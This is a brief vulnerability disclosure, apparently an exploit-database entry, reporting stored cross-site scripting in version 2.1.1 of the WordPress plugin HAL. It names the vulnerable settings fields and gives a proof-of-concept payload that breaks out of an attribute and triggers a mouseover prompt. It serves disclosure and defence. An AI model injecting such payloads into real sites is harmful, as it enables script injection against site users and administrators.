# Exploit Title: WrodPress Plugin HAL —— Stored Cross-Site Scripting
# Exploit Author: Thinkland Security Team
# Vendor Homepage: https://wordpress.org/plugins/hal/
# Version :  V 2.1.1
# Vulnerability Type: Stored Cross-Site Scripting
# Tested on Windows 10 、XAMPP
# Vulnerability proof：  
1. HAL》Type of Id，Phone，Expiration cache (minutes) and other ,insert the xss payload "OnMoUsEoVeR=prompt(1)//
![image](https://github.com/BigTiger2020/word-press/blob/main/HAL.gif)  
